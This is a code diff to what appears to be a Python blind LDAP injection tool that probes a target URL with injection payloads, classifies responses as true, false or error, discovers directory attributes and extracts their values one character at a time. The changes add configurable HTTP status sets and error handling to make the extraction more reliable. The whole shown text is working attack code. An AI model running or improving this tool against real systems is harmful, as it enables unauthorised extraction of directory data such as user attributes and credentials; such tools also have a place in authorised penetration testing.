@@ -131,6 +131,8 @@ def send_request(
     try:
         post_kwargs = {"json": data} if use_json else {"data": data}
         resp = session.post(url, **post_kwargs, timeout=TIMEOUT)
+        if verbose:
+            print(f"[V] HTTP {resp.status_code}")
         return resp
     except requests.exceptions.ConnectionError as exc:
         print(f"[!] Connection error: {exc}", file=sys.stderr)
@@ -200,21 +202,69 @@ def get_baseline(
 
 def is_true_response(
     resp: requests.Response | None,
-    true_status: int,
+    true_status: int | set[int] | list[int] | tuple[int, ...],
     true_length: int,
+    false_statuses: set[int] | list[int] | tuple[int, ...] | int | None = None,
 ) -> bool:
     """
     Return True when *resp* looks like a successful ("true") LDAP result.
 
     A response is considered "true" when:
-      - the HTTP status code matches the baseline, AND
+      - the HTTP status code is in the TRUE status set, AND
       - the content length is within LENGTH_TOLERANCE bytes of the baseline.
     """
     if resp is None:
         return False
-    length_match = abs(len(resp.content) - true_length) <= LENGTH_TOLERANCE
-    status_match = resp.status_code == true_status
-    return status_match and length_match
+    if isinstance(true_status, int):
+        true_statuses = {true_status}
+    else:
+        true_statuses = set(true_status)
+    if false_statuses is None:
+        false_status_set: set[int] = set()
+    elif isinstance(false_statuses, int):
+        false_status_set = {false_statuses}
+    else:
+        false_status_set = set(false_statuses)
+    status = resp.status_code
+    if status in true_statuses:
+        length_match = abs(len(resp.content) - true_length) <= LENGTH_TOLERANCE
+        return length_match
+    if status in false_status_set:
+        return False
+    return False
+
+
+def classify_response(
+    resp: requests.Response | None,
+    true_status: int | set[int] | list[int] | tuple[int, ...],
+    true_length: int,
+    false_statuses: set[int] | list[int] | tuple[int, ...] | int | None = None,
+) -> str:
+    """
+    Classify a response as "true", "false", or "error".
+
+    Status codes in *true_status* are evaluated with content-length matching.
+    Status codes in *false_statuses* are classified as "false".
+    Any other status code is classified as "error".
+    """
+    if resp is None:
+        return "error"
+    if isinstance(true_status, int):
+        true_statuses = {true_status}
+    else:
+        true_statuses = set(true_status)
+    if false_statuses is None:
+        false_status_set: set[int] = set()
+    elif isinstance(false_statuses, int):
+        false_status_set = {false_statuses}
+    else:
+        false_status_set = set(false_statuses)
+
+    if resp.status_code in true_statuses:
+        return "true" if is_true_response(resp, true_statuses, true_length) else "false"
+    if resp.status_code in false_status_set:
+        return "false"
+    return "error"
 
 
 def calibrate(
@@ -272,6 +322,8 @@ def detect_injection(
     verbose: bool = False,
     use_json: bool = False,
     probe_attr: str = "objectClass",
+    true_statuses: set[int] | None = None,
+    false_statuses: set[int] | None = None,
 ) -> bool:
     """
     Probe the target with common LDAP meta-characters and logic payloads.
@@ -304,14 +356,13 @@ def detect_injection(
         if resp is None:
             continue
         length = len(resp.content)
-        different = (
-            resp.status_code != true_status
-            or abs(length - true_length) > LENGTH_TOLERANCE
-        )
+        status_true_set = true_statuses if true_statuses is not None else {true_status}
+        classification = classify_response(resp, status_true_set, true_length, false_statuses)
+        different = classification != "true"
         marker = "[!] DIFFERENT" if different else "    same     "
         print(
             f"  {marker}  payload={repr(payload):<40} "
-            f"HTTP {resp.status_code}, length={length}"
+            f"HTTP {resp.status_code}, length={length}, class={classification.upper()}"
         )
         if different:
             vulnerable = True
@@ -323,10 +374,12 @@ def detect_injection(
         resp = send_request(session, url, data, verbose, use_json)
         if resp is None:
             continue
-        looks_true = is_true_response(resp, true_status, true_length)
+        status_true_set = true_statuses if true_statuses is not None else {true_status}
+        classification = classify_response(resp, status_true_set, true_length, false_statuses)
+        looks_true = classification == "true"
         print(
             f"  [{label}] payload={repr(payload):<50} "
-            f"→ {'TRUE' if looks_true else 'FALSE'}"
+            f"→ {classification.upper()}"
         )
         if looks_true:
             vulnerable = True
@@ -349,6 +402,8 @@ def discover_attributes(
     verbose: bool = False,
     use_json: bool = False,
     attributes: list[str] | None = None,
+    true_statuses: set[int] | None = None,
+    false_statuses: set[int] | None = None,
 ) -> list[str]:
     """
     Iterate through *attributes* and test each with a wildcard payload.
@@ -373,11 +428,18 @@ def discover_attributes(
         resp = send_request(session, url, data, verbose, use_json)
         if resp is None:
             continue
-        if is_true_response(resp, true_status, true_length):
+        status_true_set = true_statuses if true_statuses is not None else {true_status}
+        classification = classify_response(resp, status_true_set, true_length, false_statuses)
+        if classification == "true":
             print(f"  [+] Attribute present: {attr}")
             found.append(attr)
-        else:
+        elif classification == "false":
             print(f"  [-] Attribute absent:  {attr}")
+        else:
+            print(
+                f"  [!] Attribute {attr}: unexpected HTTP {resp.status_code} (classified as ERROR)",
+                file=sys.stderr,
+            )
 
     return found
 
@@ -397,6 +459,8 @@ def extract_attribute(
     true_length: int,
     verbose: bool = False,
     use_json: bool = False,
+    true_statuses: set[int] | None = None,
+    false_statuses: set[int] | None = None,
 ) -> str:
     """
     Extract the value of *attribute* one character at a time using LDAP wildcards.
@@ -425,11 +489,19 @@ def extract_attribute(
             resp = send_request(session, url, data, verbose, use_json)
             if resp is None:
                 continue
-            if is_true_response(resp, true_status, true_length):
+            status_true_set = true_statuses if true_statuses is not None else {true_status}
+            classification = classify_response(resp, status_true_set, true_length, false_statuses)
+            if classification == "true":
                 extracted += char
                 print(char, end="", flush=True)
                 found_char = True
                 break  # Move to next position
+            if classification == "error":
+                print(
+                    f"\n  [!] Unexpected HTTP {resp.status_code} while testing {attribute} "
+                    f"prefix '{extracted}{char}' (classified as ERROR)",
+                    file=sys.stderr,
+                )
 
         if not found_char:
             # No character matched — value is fully extracted
@@ -516,6 +588,30 @@ def parse_args() -> argparse.Namespace:
         default=False,
         help="Print every outgoing POST payload to stdout.",
     )
+    parser.add_argument(
+        "--true-status",
+        metavar="CODE",
+        action="append",
+        type=int,
+        default=None,
+        dest="true_statuses",
+        help=(
+            "HTTP status code to classify as TRUE (repeatable). "
+            "If omitted, the calibrated baseline TRUE status is used."
+        ),
+    )
+    parser.add_argument(
+        "--false-status",
+        metavar="CODE",
+        action="append",
+        type=int,
+        default=None,
+        dest="false_statuses",
+        help=(
+            "HTTP status code to classify as FALSE (repeatable). "
+            "Codes outside TRUE/FALSE sets are classified as ERROR."
+        ),
+    )
     return parser.parse_args()
 
 
@@ -587,11 +683,22 @@ def main() -> None:
     true_status, true_length = calibrate(
         session, args.url, base_data, args.param, true_status, true_length, args.verbose, use_json
     )
+    true_statuses = set(args.true_statuses) if args.true_statuses else {true_status}
+    false_statuses = set(args.false_statuses) if args.false_statuses else set()
+    overlap = true_statuses & false_statuses
+    if overlap:
+        false_statuses -= overlap
+        print(
+            f"[!] Ignoring overlapping FALSE statuses that are also TRUE: {sorted(overlap)}",
+            file=sys.stderr,
+        )
 
     # 3. Detection
     vulnerable = detect_injection(
         session, args.url, base_data, args.param, true_status, true_length, args.verbose, use_json,
         probe_attr,
+        true_statuses=true_statuses,
+        false_statuses=false_statuses,
     )
 
     if not vulnerable:
@@ -607,6 +714,7 @@ def main() -> None:
         value = extract_attribute(
             session, args.url, base_data, args.param,
             args.extract, true_status, true_length, args.verbose, use_json,
+            true_statuses=true_statuses, false_statuses=false_statuses,
         )
         if value:
             print(f"\n[+] Extracted {args.extract} = {value}")
@@ -616,6 +724,7 @@ def main() -> None:
         attrs = discover_attributes(
             session, args.url, base_data, args.param, true_status, true_length, args.verbose, use_json,
             all_attrs,
+            true_statuses=true_statuses, false_statuses=false_statuses,
         )
         if attrs:
             print(f"\n[+] Discovered attributes: {', '.join(attrs)}")
